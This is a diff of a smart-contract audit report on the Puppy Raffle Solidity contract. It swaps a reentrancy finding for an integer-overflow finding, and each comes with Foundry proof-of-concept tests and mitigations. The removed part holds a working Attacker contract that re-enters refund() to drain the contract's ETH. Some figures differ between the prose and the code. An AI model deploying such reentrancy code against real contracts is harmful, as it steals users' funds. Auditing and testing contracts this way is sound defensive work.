@@ -3,147 +3,127 @@
 
 ## Protocol Overview 
 
-**Puppy Raffle Protocol**
+### 🐾 Puppy Raffle Protocol
 
-PuppyRaffle is a self-contained Ethereum raffle that awards a randomly generated Puppy NFT and an ether prize.  
-• **Entry:** Anyone calls `enterRaffle(address[] players)` paying `entranceFee` for each address. The contract rejects duplicate addresses and emits `RaffleEnter` for transparency.  
-• **Refunds:** Before the draw, a player may call `refund(index)` to reclaim their fee; only the caller’s own index is accepted.  
-• **Lifecycle:** A raffle starts on deployment and runs for `raffleDuration` seconds. When the timer expires and ≥4 active players exist, anyone may invoke `selectWinner()`.  
-• **Winner Selection:** A pseudo-random index (using block data) is chosen, `previousWinner` is recorded, an NFT is minted, and funds are distributed: 80 % of the pot to the winner, 20 % to `feeAddress`. State is then reset for the next round.  
-• **Protocol Fees:** Collected fees accumulate in `totalFees`. The owner can `withdrawFees()` (only when no active players) or change the `feeAddress`.  
-• **Metadata:** NFTs store rarity and image URIs entirely on-chain via `tokenURI`.  
-Overall, PuppyRaffle provides a low-friction, transparent lottery with built-in refunds, fee sharing, and perpetual rounds—all in <200 lines of Solidity.
-## Critical Risk Findings
-[C-1]. Reentrancy issue found with Critical severity
+Puppy Raffle is an on-chain game that lets users buy tickets to win an NFT puppy. The contract is written for Solidity 0.7.6 and thoroughly tested with Foundry.
+
+1. **Entering** – Anyone calls `enterRaffle(address[] newPlayers)` sending `entranceFee` (1 ETH) per address. The function rejects duplicate addresses and mismatched payment, then appends players to an array. 20 % of each ticket is earmarked as protocol fees.
+
+2. **Refunds** – Before a winner is chosen, a player may call `refund(uint256 index)` to reclaim their fee. The slot is zeroed so the array length stays constant and duplicates remain impossible.
+
+3. **Selecting a Winner** – After `raffleDuration` (1 day by default) and once ≥1 active player exists, anyone can invoke `selectWinner()`. A pseudo-random index is derived from block data; that address receives 80 % of the contract balance and a freshly minted Puppy NFT whose rarity is randomly assigned. The raffle state resets for the next round.
+
+4. **Fee Management** – Accumulated fees are withdrawable by `feeAddress` via `withdrawFees()` only when all players have exited. The owner can update `feeAddress` with `changeFeeAddress()`.
+
+The design emphasizes fairness (no duplicates, refund option), transparency, and clean separation of player funds and protocol earnings.
 ## High Risk Findings
-[H-1]. Randomness issue found with High severity
+[H-1]. Reentrancy issue found with High severity
+[H-2]. Randomness issue found with High severity
+## Medium Risk Findings
+[M-1]. DOS issue found with Medium severity
+[M-2]. Unexpected Eth issue found with Medium severity
+## Low Risk Findings
+[L-1]. Integer Overflow issue in PuppyRaffle::selectWinner
 
 
 ### Number of Findings
-- C: 1
-- H: 1
-- M: 0
-- L: 0
+- C: 0
+- H: 2
+- M: 2
+- L: 1
 - I: 0
 
 
 
-# Critical Risk Findings
+# Low Risk Findings
 
-## [C-1]. Reentrancy issue in PuppyRaffle::refund
+## [L-1]. Integer Overflow issue in PuppyRaffle::selectWinner
 
 ## Description
-The `refund` function follows the 'calls before state updates' pattern, a violation of the Checks-Effects-Interactions (CEI) principle. It transfers the `entranceFee` back to the player using `sendValue` (which uses a low-level `.call`) before updating the `players` array to nullify the player's entry. A malicious contract can exploit this by re-entering the `refund` function from its `receive()` or `fallback()` function. Each re-entrant call will pass the initial checks because the player's state has not been updated, allowing the attacker to repeatedly withdraw the `entranceFee` until the contract's balance is drained.
+In `selectWinner`, the protocol fee is calculated and added to `totalFees`. `totalFees` is a `uint64` to save gas via storage packing, but the `fee` variable is a `uint256`. The line `totalFees = totalFees + uint64(fee);` performs an unsafe downcast. If the raffle accumulates a very large prize pool over multiple rounds, the `fee` could exceed `type(uint64).max`. The subsequent addition would overflow `totalFees`, causing it to wrap around to a small number. This leads to incorrect accounting and will cause the `withdrawFees` function to fail, as the contract's actual balance will be much larger than the small, wrapped-around `totalFees` value.
 
 ## Impact
-A malicious actor can create a contract to enter the raffle and then call `refund` to drain the entire prize pool, stealing all funds from other participants. This results in a total loss of funds for the raffle.
+If the owner deploys the contract with an entranceFee so large that the 20 % protocol fee of one (or multiple) raffles exceeds 2^64-1 wei, the value is truncated when cast to uint64. From that point on, `totalFees` becomes inaccurate, and `withdrawFees()` will revert forever, permanently locking the protocol-fee funds that are already inside the contract. No user funds can be stolen, only the protocol’s fees become stuck.
 
 ## Proof of Concept
-pragma solidity 0.7.6;
-
-/*
-1. Any user (or previous rounds) leaves ETH inside PuppyRaffle. For demo we force-fund it with vm.deal().
-2. Attacker buys ONE raffle ticket.
-3. During the first refund() call the contract sends the ticket price before it marks the player as refunded.
-4. The attacker re-enters refund() from its receive() function as long as the raffle still owns >= entranceFee wei.
-5. Each nested call passes the same "playerIndex" check because the array slot is not zeroed yet.
-6. The loop stops only when the contract balance becomes < entranceFee, effectively draining every wei that belonged to honest players.
-*/
-contract Attacker {
-    PuppyRaffle public raffle;
-    uint256 public reentered;
-
-    constructor(PuppyRaffle _raffle) {
-        raffle = _raffle;
-    }
-
-    function attack() external payable {
-        // Buy exactly one ticket
-        address[] memory players = new address[](1);
-        players[0] = address(this);
-        raffle.enterRaffle{value: raffle.entranceFee()}(players);
-
-        uint256 idx = raffle.getActivePlayerIndex(address(this));
-        raffle.refund(idx); // first refund – starts the re-entrancy cascade
-    }
-
-    receive() external payable {
-        if (address(raffle).balance >= raffle.entranceFee()) {
-            reentered++;
-            uint256 idx = raffle.getActivePlayerIndex(address(this));
-            raffle.refund(idx);
-        }
-    }
-}
-
+1. Set a very high `entranceFee` such that a few rounds of the raffle will generate fees exceeding `type(uint64).max`.
+2. For instance, `entranceFee` = `(type(uint64).max / 4) * 5`.
+3. Run a raffle with 4 players. The total collected is `type(uint64).max * 5`. The fee (20%) is `type(uint64).max`.
+4. In `selectWinner`, `totalFees` becomes `type(uint64).max`.
+5. Run a second, identical raffle round. The new fee is again `type(uint64).max`.
+6. The calculation `totalFees = totalFees + uint64(fee)` becomes `type(uint64).max + type(uint64).max`, which overflows and wraps `totalFees` to `type(uint64).max - 1`.
+7. The actual ETH balance for fees in the contract is `2 * type(uint64).max`, but `totalFees` stores a much smaller number. The `withdrawFees` function is now permanently broken.
 
 ## Proof of Code
+```solidity
 // SPDX-License-Identifier: MIT
-pragma solidity 0.7.6;
+pragma solidity ^0.7.6;
 
-import "forge-std/Test.sol";
+import {Test} from "forge-std/Test.sol";
 import {PuppyRaffle} from "../src/PuppyRaffle.sol";
 
-contract ReentrancyRefundTest is Test {
-    PuppyRaffle raffle;
-    Attacker attacker;
-
-    uint256 constant ENTRANCE_FEE = 0.1 ether;
+contract IntegerOverflowTest is Test {
+    PuppyRaffle puppyRaffle;
+    address public feeAddress = makeAddr("feeAddress");
+    uint256 public constant RAFFLE_DURATION = 1 days;
+    // Set a massive entrance fee to trigger the overflow quickly
+    uint256 public constant HUGE_ENTRANCE_FEE = (2**64 / 4) * 5; // 20% of this is 2**64 / 4
 
     function setUp() public {
-        raffle = new PuppyRaffle(ENTRANCE_FEE, address(0xBEEF), 1 days);
-
-        // Pretend other players already deposited 5 ether
-        vm.deal(address(raffle), 5 ether);
-
-        attacker = new Attacker(raffle);
-        vm.deal(address(attacker), 1 ether);
+        puppyRaffle = new PuppyRaffle(HUGE_ENTRANCE_FEE, feeAddress, RAFFLE_DURATION);
     }
 
-    function testDrainViaReentrancy() public {
-        uint256 balanceBefore = address(raffle).balance;
+    function testTotalFeesOverflow() public {
+        // Run first round, totalFees will be close to uint64.max
+        runRaffleRound(4);
+        uint64 feesAfterFirstRound = puppyRaffle.totalFees();
+        uint256 expectedFee = (HUGE_ENTRANCE_FEE * 4 * 20) / 100;
+        assertEq(feesAfterFirstRound, uint64(expectedFee));
 
-        vm.startPrank(address(attacker));
-        attacker.attack{value: ENTRANCE_FEE}();
-        vm.stopPrank();
-
-        uint256 balanceAfter = address(raffle).balance;
-        uint256 attackerProfit = address(attacker).balance - (1 ether - ENTRANCE_FEE); // subtract ticket cost
-
-        assertEq(balanceAfter, 0, "raffle should be emptied");
-        assertEq(attackerProfit, balanceBefore, "attacker stole the whole pool");
-        assertTrue(attacker.reentered() > 0, "re-entrancy occurred");
-    }
-}
-
-// Minimal attacker from PoC
-contract Attacker {
-    PuppyRaffle public raffle;
-    uint256 public reentered;
-
-    constructor(PuppyRaffle _raffle) {
-        raffle = _raffle;
-    }
-
-    function attack() external payable {
-        address[] memory players = new address[](1);
-        players[0] = address(this);
-        raffle.enterRaffle{value: raffle.entranceFee()}(players);
-        uint256 idx = raffle.getActivePlayerIndex(address(this));
-        raffle.refund(idx);
+        // Run a second round. The addition to totalFees will overflow.
+        runRaffleRound(4);
+        uint64 feesAfterSecondRound = puppyRaffle.totalFees();
+        
+        // The fees should be 2 * expectedFee, but it has overflowed.
+        uint256 correctTotalFees = expectedFee * 2;
+        assertTrue(feesAfterSecondRound < correctTotalFees);
+        
+        // The actual contract balance holding the fees will be correctTotalFees
+        // But the totalFees variable is wrong. Withdraw will fail.
+        assertEq(address(puppyRaffle).balance, correctTotalFees);
+        
+        vm.prank(feeAddress);
+        vm.expectRevert("PuppyRaffle: There are currently players active!"); // Misleading error
+        puppyRaffle.withdrawFees();
     }
 
-    receive() external payable {
-        if (address(raffle).balance >= raffle.entranceFee()) {
-            reentered++;
-            uint256 idx = raffle.getActivePlayerIndex(address(this));
-            raffle.refund(idx);
+    function runRaffleRound(uint256 numPlayers) internal {
+        address[] memory players = new address[](numPlayers);
+        for (uint256 i = 0; i < numPlayers; i++) {
+            players[i] = address(uint160(uint256(keccak256(abi.encodePacked(block.timestamp, i)))));
         }
+        puppyRaffle.enterRaffle{value: HUGE_ENTRANCE_FEE * numPlayers}(players);
+        vm.warp(block.timestamp + RAFFLE_DURATION + 1);
+        puppyRaffle.selectWinner();
     }
 }
+```
 
 ## Suggested Mitigation
-Move `players[playerIndex] = address(0);` to *before* the ETH transfer and/or add `ReentrancyGuard` to the contract so that refund() is protected with the `nonReentrant` modifier. Both changes guarantee that a re-entrant refund() call will fail the `playerAddress != address(0)` check, fully eliminating the vulnerability.
+Use a `uint256` for `totalFees` to prevent overflow, or use a safe math library to check for overflow before the addition. Given that `fee` is already `uint256`, it is simplest and safest to make `totalFees` a `uint256` as well. The gas savings from storage packing are not worth the risk of losing all protocol fees.
+
+```diff
+-   // We do some storage packing to save gas
+-   address public feeAddress;
+-   uint64 public totalFees = 0;
++   address public feeAddress;
++   uint256 public totalFees = 0;
+
+// ... in selectWinner() ...
+-
+-       totalFees = totalFees + uint64(fee);
++       totalFees = totalFees + fee;
+```
 
 
 
